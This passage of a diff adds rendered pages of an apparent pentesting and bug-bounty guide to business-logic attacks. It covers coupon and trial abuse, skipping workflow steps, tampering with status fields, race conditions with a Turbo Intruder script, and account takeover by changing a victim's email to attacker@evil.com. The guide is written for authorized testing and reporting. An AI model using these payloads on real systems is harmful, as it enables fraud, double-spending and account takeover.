+</span><span id="__span-4-13"><a id="__codelineno-4-13" name="__codelineno-4-13" href="#__codelineno-4-13"></a>POST<span class="w"> </span>/api/cart/coupon<span class="w"> </span><span class="o">{</span><span class="s2">&quot;code&quot;</span>:<span class="w"> </span><span class="s2">&quot;EXPIRED2024&quot;</span><span class="o">}</span>
+</span><span id="__span-4-14"><a id="__codelineno-4-14" name="__codelineno-4-14" href="#__codelineno-4-14"></a><span class="c1"># Does server validate expiry or just check if code exists?</span>
+</span><span id="__span-4-15"><a id="__codelineno-4-15" name="__codelineno-4-15" href="#__codelineno-4-15"></a>
+</span><span id="__span-4-16"><a id="__codelineno-4-16" name="__codelineno-4-16" href="#__codelineno-4-16"></a><span class="c1"># 4. Coupon reuse after order cancellation:</span>
+</span><span id="__span-4-17"><a id="__codelineno-4-17" name="__codelineno-4-17" href="#__codelineno-4-17"></a><span class="c1"># Apply coupon → place order → cancel → try coupon again</span>
+</span><span id="__span-4-18"><a id="__codelineno-4-18" name="__codelineno-4-18" href="#__codelineno-4-18"></a><span class="c1"># Should invalidate — often doesn&#39;t</span>
+</span><span id="__span-4-19"><a id="__codelineno-4-19" name="__codelineno-4-19" href="#__codelineno-4-19"></a>
+</span><span id="__span-4-20"><a id="__codelineno-4-20" name="__codelineno-4-20" href="#__codelineno-4-20"></a><span class="c1"># 5. Coupon for wrong product category:</span>
+</span><span id="__span-4-21"><a id="__codelineno-4-21" name="__codelineno-4-21" href="#__codelineno-4-21"></a><span class="c1"># Coupon scoped to &quot;electronics&quot; → apply to non-electronics</span>
+</span><span id="__span-4-22"><a id="__codelineno-4-22" name="__codelineno-4-22" href="#__codelineno-4-22"></a><span class="c1"># Does server validate the restriction?</span>
+</span></code></pre></div>
+<hr />
+<h3 id="624-free-trial-and-subscription-bypass">6.2.4 Free Trial and Subscription Bypass<a class="headerlink" href="#624-free-trial-and-subscription-bypass" title="Permanent link">&para;</a></h3>
+<div class="language-bash highlight"><span class="filename">subscription_bypass.sh</span><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="c1"># 1. Re-register after trial expires using email variations:</span>
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="c1"># user+1@gmail.com, user+2@gmail.com → same inbox, treated as different accounts</span>
+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>
+</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a><span class="c1"># 2. Client-supplied date tampering:</span>
+</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a>PUT<span class="w"> </span>/api/subscription<span class="w"> </span><span class="o">{</span><span class="s2">&quot;trial_end&quot;</span>:<span class="w"> </span><span class="s2">&quot;2030-12-31&quot;</span>,<span class="w"> </span><span class="s2">&quot;status&quot;</span>:<span class="w"> </span><span class="s2">&quot;active&quot;</span><span class="o">}</span>
+</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a><span class="c1"># Does server trust client-supplied dates?</span>
+</span><span id="__span-5-7"><a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a>
+</span><span id="__span-5-8"><a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a><span class="c1"># 3. Access premium features after trial expires:</span>
+</span><span id="__span-5-9"><a id="__codelineno-5-9" name="__codelineno-5-9" href="#__codelineno-5-9"></a><span class="c1"># Let trial expire → directly access /api/premium/features</span>
+</span><span id="__span-5-10"><a id="__codelineno-5-10" name="__codelineno-5-10" href="#__codelineno-5-10"></a><span class="c1"># Does server re-validate subscription on every request?</span>
+</span><span id="__span-5-11"><a id="__codelineno-5-11" name="__codelineno-5-11" href="#__codelineno-5-11"></a>
+</span><span id="__span-5-12"><a id="__codelineno-5-12" name="__codelineno-5-12" href="#__codelineno-5-12"></a><span class="c1"># 4. Downgrade but retain features:</span>
+</span><span id="__span-5-13"><a id="__codelineno-5-13" name="__codelineno-5-13" href="#__codelineno-5-13"></a><span class="c1"># Downgrade plan → check if premium features are still accessible</span>
+</span><span id="__span-5-14"><a id="__codelineno-5-14" name="__codelineno-5-14" href="#__codelineno-5-14"></a><span class="c1"># Frontend hides them — does backend enforce?</span>
+</span><span id="__span-5-15"><a id="__codelineno-5-15" name="__codelineno-5-15" href="#__codelineno-5-15"></a>
+</span><span id="__span-5-16"><a id="__codelineno-5-16" name="__codelineno-5-16" href="#__codelineno-5-16"></a><span class="c1"># 5. Plan parameter at registration:</span>
+</span><span id="__span-5-17"><a id="__codelineno-5-17" name="__codelineno-5-17" href="#__codelineno-5-17"></a>POST<span class="w"> </span>/api/users/register<span class="w"> </span><span class="o">{</span><span class="s2">&quot;email&quot;</span>:<span class="w"> </span><span class="s2">&quot;x@x.com&quot;</span>,<span class="w"> </span><span class="s2">&quot;plan&quot;</span>:<span class="w"> </span><span class="s2">&quot;enterprise&quot;</span><span class="o">}</span>
+</span><span id="__span-5-18"><a id="__codelineno-5-18" name="__codelineno-5-18" href="#__codelineno-5-18"></a><span class="c1"># Does server validate plan at registration or trust client value?</span>
+</span></code></pre></div>
+<hr />
+<h2 id="63-workflow-and-state-bypass">6.3 Workflow and State Bypass<a class="headerlink" href="#63-workflow-and-state-bypass" title="Permanent link">&para;</a></h2>
+<h3 id="631-multi-step-process-skip">6.3.1 Multi-Step Process Skip<a class="headerlink" href="#631-multi-step-process-skip" title="Permanent link">&para;</a></h3>
+<p><strong>When to use:</strong> On any multi-step flow. Map every step with Burp running, then attempt to skip or reorder them. The server should validate preconditions at every step — most don't.</p>
+<p><strong>Common flows to test:</strong></p>
+<div class="tabbed-set tabbed-alternate" data-tabs="1:4"><input checked="checked" id="__tabbed_1_1" name="__tabbed_1" type="radio" /><input id="__tabbed_1_2" name="__tabbed_1" type="radio" /><input id="__tabbed_1_3" name="__tabbed_1" type="radio" /><input id="__tabbed_1_4" name="__tabbed_1" type="radio" /><div class="tabbed-labels"><label for="__tabbed_1_1">Checkout</label><label for="__tabbed_1_2">Verification</label><label for="__tabbed_1_3">KYC / Identity</label><label for="__tabbed_1_4">Password change</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>Normal: Cart → Shipping → Payment → Confirm
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>Attack: Skip Payment → navigate directly to Confirm
+</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>Does the app place a free order?
+</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a>
+</span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a>Look for:
+</span><span id="__span-6-7"><a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a>- payment_intent_id in step 3 — can you forge or reuse one?
+</span><span id="__span-6-8"><a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a>- Step indicator in request: {&quot;step&quot;: 2} → try {&quot;step&quot;: 4}
+</span><span id="__span-6-9"><a id="__codelineno-6-9" name="__codelineno-6-9" href="#__codelineno-6-9"></a>- Direct URL: GET /checkout/step3 → try GET /checkout/complete
+</span></code></pre></div>
+</div>
+<div class="tabbed-block">
+<div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>Normal: Register → Verify email → Access account
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>
+</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>Attack: Skip verification → access /dashboard directly
+</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a>Does the app require verified email for every authenticated action
+</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a>or only on the first login?
+</span><span id="__span-7-6"><a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a>
+</span><span id="__span-7-7"><a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a>Also test:
+</span><span id="__span-7-8"><a id="__codelineno-7-8" name="__codelineno-7-8" href="#__codelineno-7-8"></a>- Access sensitive actions (change password, add payment) without verified email
+</span><span id="__span-7-9"><a id="__codelineno-7-9" name="__codelineno-7-9" href="#__codelineno-7-9"></a>- API endpoints accessible with unverified session
+</span></code></pre></div>
+</div>
+<div class="tabbed-block">
+<div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>Normal: Submit documents → Admin approval → Access financial features
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>
+</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>Attack: Skip approval step → try accessing financial features directly
+</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a>Is step 2 enforced server-side or just hidden in the UI?
+</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a>
+</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a>Also test:
+</span><span id="__span-8-7"><a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a>- Status field tamper: PATCH /api/kyc {&quot;status&quot;: &quot;approved&quot;}
+</span><span id="__span-8-8"><a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a>- Direct access: GET /api/financial/transfer before KYC complete
+</span></code></pre></div>
+</div>
+<div class="tabbed-block">
+<div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>Normal: Enter current password → Enter new password
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>
+</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>Attack: Skip current password verification
+</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a>POST /api/password/change {&quot;new_password&quot;: &quot;hacked&quot;} (no current_password field)
+</span><span id="__span-9-5"><a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a>
+</span><span id="__span-9-6"><a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a>Is current password verified server-side before allowing change?
+</span></code></pre></div>
+</div>
+</div>
+</div>
+<hr />
+<h3 id="632-status-parameter-manipulation">6.3.2 Status Parameter Manipulation<a class="headerlink" href="#632-status-parameter-manipulation" title="Permanent link">&para;</a></h3>
+<p><strong>When to use:</strong> On any PUT/PATCH request that includes a status field. Try setting it to every valid status value.</p>
+<div class="language-bash highlight"><span class="filename">status_tamper.sh</span><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="c1"># Order status:</span>
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>PUT<span class="w"> </span>/api/orders/1042<span class="w"> </span><span class="o">{</span><span class="s2">&quot;status&quot;</span>:<span class="w"> </span><span class="s2">&quot;shipped&quot;</span><span class="o">}</span><span class="w">    </span><span class="c1"># mark own order shipped</span>
+</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>PUT<span class="w"> </span>/api/orders/1042<span class="w"> </span><span class="o">{</span><span class="s2">&quot;status&quot;</span>:<span class="w"> </span><span class="s2">&quot;refunded&quot;</span><span class="o">}</span><span class="w">   </span><span class="c1"># trigger self-refund</span>
+</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a>PUT<span class="w"> </span>/api/orders/1042<span class="w"> </span><span class="o">{</span><span class="s2">&quot;status&quot;</span>:<span class="w"> </span><span class="s2">&quot;completed&quot;</span><span class="o">}</span><span class="w">  </span><span class="c1"># bypass pending state</span>
+</span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a>
+</span><span id="__span-10-6"><a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a><span class="c1"># Account status:</span>
+</span><span id="__span-10-7"><a id="__codelineno-10-7" name="__codelineno-10-7" href="#__codelineno-10-7"></a>PATCH<span class="w"> </span>/api/users/me<span class="w"> </span><span class="o">{</span><span class="s2">&quot;verified&quot;</span>:<span class="w"> </span>true<span class="o">}</span><span class="w">         </span><span class="c1"># self-verify without email</span>
+</span><span id="__span-10-8"><a id="__codelineno-10-8" name="__codelineno-10-8" href="#__codelineno-10-8"></a>PATCH<span class="w"> </span>/api/users/me<span class="w"> </span><span class="o">{</span><span class="s2">&quot;is_premium&quot;</span>:<span class="w"> </span>true<span class="o">}</span><span class="w">       </span><span class="c1"># self-upgrade</span>
+</span><span id="__span-10-9"><a id="__codelineno-10-9" name="__codelineno-10-9" href="#__codelineno-10-9"></a>PATCH<span class="w"> </span>/api/users/me<span class="w"> </span><span class="o">{</span><span class="s2">&quot;kyc_status&quot;</span>:<span class="w"> </span><span class="s2">&quot;approved&quot;</span><span class="o">}</span><span class="w"> </span><span class="c1"># self-approve KYC</span>
+</span><span id="__span-10-10"><a id="__codelineno-10-10" name="__codelineno-10-10" href="#__codelineno-10-10"></a>
+</span><span id="__span-10-11"><a id="__codelineno-10-11" name="__codelineno-10-11" href="#__codelineno-10-11"></a><span class="c1"># Ticket/task status:</span>
+</span><span id="__span-10-12"><a id="__codelineno-10-12" name="__codelineno-10-12" href="#__codelineno-10-12"></a>PUT<span class="w"> </span>/api/tickets/55<span class="w"> </span><span class="o">{</span><span class="s2">&quot;status&quot;</span>:<span class="w"> </span><span class="s2">&quot;closed&quot;</span><span class="o">}</span><span class="w">       </span><span class="c1"># close before resolution</span>
+</span><span id="__span-10-13"><a id="__codelineno-10-13" name="__codelineno-10-13" href="#__codelineno-10-13"></a>PUT<span class="w"> </span>/api/tasks/88<span class="w">  </span><span class="o">{</span><span class="s2">&quot;status&quot;</span>:<span class="w"> </span><span class="s2">&quot;approved&quot;</span><span class="o">}</span><span class="w">      </span><span class="c1"># self-approve</span>
+</span><span id="__span-10-14"><a id="__codelineno-10-14" name="__codelineno-10-14" href="#__codelineno-10-14"></a>
+</span><span id="__span-10-15"><a id="__codelineno-10-15" name="__codelineno-10-15" href="#__codelineno-10-15"></a><span class="c1"># Pattern: find any status field in PUT/PATCH</span>
+</span><span id="__span-10-16"><a id="__codelineno-10-16" name="__codelineno-10-16" href="#__codelineno-10-16"></a><span class="c1"># Try: every valid status value + invalid values + empty string</span>
+</span><span id="__span-10-17"><a id="__codelineno-10-17" name="__codelineno-10-17" href="#__codelineno-10-17"></a><span class="c1"># Look for: privilege escalation, financial gain, bypassed verification</span>
+</span></code></pre></div>
+<hr />
+<h2 id="64-race-conditions">6.4 Race Conditions<a class="headerlink" href="#64-race-conditions" title="Permanent link">&para;</a></h2>
+<p>When two or more requests are processed concurrently and share a resource, the application may process both before either has completed the state change that would prevent the second. A one-time coupon applied twice simultaneously. A $100 withdrawal processed twice from a $100 balance.</p>
+<p><strong>The key question:</strong> <em>Does the application check a condition and then act on it, with a gap between the check and the action where another request could interfere?</em></p>
+<h3 id="641-high-value-targets">6.4.1 High-Value Targets<a class="headerlink" href="#641-high-value-targets" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>Target</th>
+<th>Attack</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>One-time coupons / promo codes</td>
+<td>Apply twice simultaneously</td>
+</tr>
+<tr>
+<td>Gift card / voucher redemption</td>
+<td>Redeem twice simultaneously</td>
+</tr>
+<tr>
+<td>Referral bonuses</td>
+<td>Trigger twice</td>
+</tr>
+<tr>
+<td>Payment / transfer operations</td>
+<td>Double-spend</td>
+</tr>
+<tr>
+<td>Password reset token use</td>
+<td>Use same token twice simultaneously</td>
+</tr>
+<tr>
+<td>Like / vote limits</td>
+<td>Vote twice simultaneously</td>
+</tr>
+<tr>
+<td>Rate-limited actions</td>
+<td>Bypass limit via concurrent requests</td>
+</tr>
+<tr>
+<td>Account deletion + data export</td>
+<td>Export during deletion window</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h3 id="642-single-packet-attack-http2">6.4.2 Single-Packet Attack (HTTP/2)<a class="headerlink" href="#642-single-packet-attack-http2" title="Permanent link">&para;</a></h3>
+<p><strong>The most reliable race condition technique.</strong> HTTP/2 multiplexes multiple requests over a single TCP connection. Sending multiple requests in a single packet means they arrive simultaneously — eliminating the network jitter that causes false negatives in HTTP/1.1 testing.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>In Burp Suite (2022.9+):
+</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>1. Send target request to Repeater
+</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>2. Duplicate the tab 10-20 times (same request in each)
+</span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a>3. Change protocol to HTTP/2 in each tab
+</span><span id="__span-11-5"><a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a>4. Right-click tab group → &quot;Send group in parallel (single-packet attack)&quot;
+</span><span id="__span-11-6"><a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a>5. All requests sent in one TCP packet → server processes truly simultaneously
+</span><span id="__span-11-7"><a id="__codelineno-11-7" name="__codelineno-11-7" href="#__codelineno-11-7"></a>
+</span><span id="__span-11-8"><a id="__codelineno-11-8" name="__codelineno-11-8" href="#__codelineno-11-8"></a>Always prefer single-packet attack over Turbo Intruder for HTTP/2 targets.
+</span></code></pre></div>
+<hr />
+<h3 id="643-turbo-intruder-http11">6.4.3 Turbo Intruder (HTTP/1.1)<a class="headerlink" href="#643-turbo-intruder-http11" title="Permanent link">&para;</a></h3>
+<div class="language-python highlight"><span class="filename">race_condition_script.py</span><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="c1"># Right-click request → Extensions → Turbo Intruder → Send to Turbo Intruder</span>
+</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>
+</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a><span class="k">def</span><span class="w"> </span><span class="nf">queueRequests</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">wordlists</span><span class="p">):</span>
+</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a>    <span class="n">engine</span> <span class="o">=</span> <span class="n">RequestEngine</span><span class="p">(</span>
+</span><span id="__span-12-5"><a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a>        <span class="n">endpoint</span><span class="o">=</span><span class="n">target</span><span class="o">.</span><span class="n">endpoint</span><span class="p">,</span>
+</span><span id="__span-12-6"><a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a>        <span class="n">concurrentConnections</span><span class="o">=</span><span class="mi">20</span><span class="p">,</span>
+</span><span id="__span-12-7"><a id="__codelineno-12-7" name="__codelineno-12-7" href="#__codelineno-12-7"></a>        <span class="n">requestsPerConnection</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span>
+</span><span id="__span-12-8"><a id="__codelineno-12-8" name="__codelineno-12-8" href="#__codelineno-12-8"></a>        <span class="n">pipeline</span><span class="o">=</span><span class="kc">False</span>
+</span><span id="__span-12-9"><a id="__codelineno-12-9" name="__codelineno-12-9" href="#__codelineno-12-9"></a>    <span class="p">)</span>
+</span><span id="__span-12-10"><a id="__codelineno-12-10" name="__codelineno-12-10" href="#__codelineno-12-10"></a>    <span class="c1"># Queue same request 20 times:</span>
+</span><span id="__span-12-11"><a id="__codelineno-12-11" name="__codelineno-12-11" href="#__codelineno-12-11"></a>    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">20</span><span class="p">):</span>
+</span><span id="__span-12-12"><a id="__codelineno-12-12" name="__codelineno-12-12" href="#__codelineno-12-12"></a>        <span class="n">engine</span><span class="o">.</span><span class="n">queue</span><span class="p">(</span><span class="n">target</span><span class="o">.</span><span class="n">req</span><span class="p">,</span> <span class="n">gate</span><span class="o">=</span><span class="s1">&#39;race&#39;</span><span class="p">)</span>
+</span><span id="__span-12-13"><a id="__codelineno-12-13" name="__codelineno-12-13" href="#__codelineno-12-13"></a>
+</span><span id="__span-12-14"><a id="__codelineno-12-14" name="__codelineno-12-14" href="#__codelineno-12-14"></a>    <span class="n">engine</span><span class="o">.</span><span class="n">openGate</span><span class="p">(</span><span class="s1">&#39;race&#39;</span><span class="p">)</span>  <span class="c1"># release all simultaneously (last-byte sync)</span>
+</span><span id="__span-12-15"><a id="__codelineno-12-15" name="__codelineno-12-15" href="#__codelineno-12-15"></a>
+</span><span id="__span-12-16"><a id="__codelineno-12-16" name="__codelineno-12-16" href="#__codelineno-12-16"></a><span class="k">def</span><span class="w"> </span><span class="nf">handleResponse</span><span class="p">(</span><span class="n">req</span><span class="p">,</span> <span class="n">interesting</span><span class="p">):</span>
+</span><span id="__span-12-17"><a id="__codelineno-12-17" name="__codelineno-12-17" href="#__codelineno-12-17"></a>    <span class="k">if</span> <span class="n">req</span><span class="o">.</span><span class="n">status</span> <span class="o">==</span> <span class="mi">200</span> <span class="ow">and</span> <span class="s1">&#39;success&#39;</span> <span class="ow">in</span> <span class="n">req</span><span class="o">.</span><span class="n">response</span><span class="p">:</span>
+</span><span id="__span-12-18"><a id="__codelineno-12-18" name="__codelineno-12-18" href="#__codelineno-12-18"></a>        <span class="n">table</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">req</span><span class="p">)</span>
+</span><span id="__span-12-19"><a id="__codelineno-12-19" name="__codelineno-12-19" href="#__codelineno-12-19"></a>    <span class="k">if</span> <span class="s1">&#39;coupon applied&#39;</span> <span class="ow">in</span> <span class="n">req</span><span class="o">.</span><span class="n">response</span><span class="o">.</span><span class="n">lower</span><span class="p">():</span>
+</span><span id="__span-12-20"><a id="__codelineno-12-20" name="__codelineno-12-20" href="#__codelineno-12-20"></a>        <span class="n">table</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">req</span><span class="p">)</span>
+</span></code></pre></div>
+<p><strong>Interpreting results:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Result</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Multiple 200s where only one should succeed</td>
+<td>Race condition confirmed</td>
+</tr>
+<tr>
+<td>Balance credited/debited multiple times</td>
+<td>Confirmed — document and report</td>
+</tr>
+<tr>
+<td>All requests except first return 400/409</td>
+<td>Not vulnerable</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h3 id="644-poc-and-reporting">6.4.4 PoC and Reporting<a class="headerlink" href="#644-poc-and-reporting" title="Permanent link">&para;</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>PoC structure:
+</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>1. Set up precondition (load coupon, set account balance, prepare token)
+</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>2. Send N concurrent requests (show Turbo Intruder config or single-packet setup)
+</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a>3. Show multiple success responses (screenshot)
+</span><span id="__span-13-5"><a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a>4. Show result: balance credited twice, coupon applied twice, etc.
+</span><span id="__span-13-6"><a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a>
+</span><span id="__span-13-7"><a id="__codelineno-13-7" name="__codelineno-13-7" href="#__codelineno-13-7"></a>Impact framing:
+</span><span id="__span-13-8"><a id="__codelineno-13-8" name="__codelineno-13-8" href="#__codelineno-13-8"></a>- Coupon reuse:     &quot;Arbitrary discount — potential $0 purchases&quot;
+</span><span id="__span-13-9"><a id="__codelineno-13-9" name="__codelineno-13-9" href="#__codelineno-13-9"></a>- Double-spend:     &quot;Financial loss to platform proportional to transaction limit&quot;
+</span><span id="__span-13-10"><a id="__codelineno-13-10" name="__codelineno-13-10" href="#__codelineno-13-10"></a>- Referral abuse:   &quot;Infinite referral credit generation&quot;
+</span><span id="__span-13-11"><a id="__codelineno-13-11" name="__codelineno-13-11" href="#__codelineno-13-11"></a>- Rate limit bypass:&quot;Brute-force of OTP/token protected by rate limit&quot;
+</span><span id="__span-13-12"><a id="__codelineno-13-12" name="__codelineno-13-12" href="#__codelineno-13-12"></a>- Vote abuse:       &quot;Manipulation of ranking/reputation systems&quot;
+</span></code></pre></div>
+<hr />
+<h2 id="65-account-and-ownership-logic">6.5 Account and Ownership Logic<a class="headerlink" href="#65-account-and-ownership-logic" title="Permanent link">&para;</a></h2>
+<h3 id="651-logic-based-account-takeover">6.5.1 Logic-Based Account Takeover<a class="headerlink" href="#651-logic-based-account-takeover" title="Permanent link">&para;</a></h3>
+<p>No JWT exploit, no SQL injection — just logic flaws that result in ATO.</p>
+<div class="tabbed-set tabbed-alternate" data-tabs="2:4"><input checked="checked" id="__tabbed_2_1" name="__tabbed_2" type="radio" /><input id="__tabbed_2_2" name="__tabbed_2" type="radio" /><input id="__tabbed_2_3" name="__tabbed_2" type="radio" /><input id="__tabbed_2_4" name="__tabbed_2" type="radio" /><div class="tabbed-labels"><label for="__tabbed_2_1">Email change without re-auth</label><label for="__tabbed_2_2">Account merge</label><label for="__tabbed_2_3">Reset without token</label><label for="__tabbed_2_4">Support bypass</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<div class="language-bash highlight"><span class="filename">email_change_ato.sh</span><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="c1"># If no current password required to change email:</span>
+</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>PUT<span class="w"> </span>/api/users/me<span class="w"> </span><span class="o">{</span><span class="s2">&quot;email&quot;</span>:<span class="w"> </span><span class="s2">&quot;attacker@evil.com&quot;</span><span class="o">}</span>
+</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a><span class="c1"># Change email → trigger password reset → ATO</span>
+</span><span id="__span-14-4"><a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a>
+</span><span id="__span-14-5"><a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a><span class="c1"># Combined with IDOR (Part 3):</span>
+</span><span id="__span-14-6"><a id="__codelineno-14-6" name="__codelineno-14-6" href="#__codelineno-14-6"></a>PUT<span class="w"> </span>/api/users/1043<span class="w"> </span><span class="o">{</span><span class="s2">&quot;email&quot;</span>:<span class="w"> </span><span class="s2">&quot;attacker@evil.com&quot;</span><span class="o">}</span>
+</span><span id="__span-14-7"><a id="__codelineno-14-7" name="__codelineno-14-7" href="#__codelineno-14-7"></a><span class="c1"># Change victim&#39;s email → trigger reset → ATO</span>
+</span></code></pre></div>
+</div>
+<div class="tabbed-block">
+<div class="language-text highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>1. Victim has account: victim@gmail.com
+</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>2. Attacker changes their email to victim@gmail.com (pending verification)
+</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>3. Victim logs in via OAuth using victim@gmail.com
+</span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a>4. Does app merge accounts or link OAuth to attacker&#39;s account?
+</span><span id="__span-15-5"><a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a>
+</span><span id="__span-15-6"><a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a>Test both directions:
+</span><span id="__span-15-7"><a id="__codelineno-15-7" name="__codelineno-15-7" href="#__codelineno-15-7"></a>- Change email to victim&#39;s → wait for OAuth login
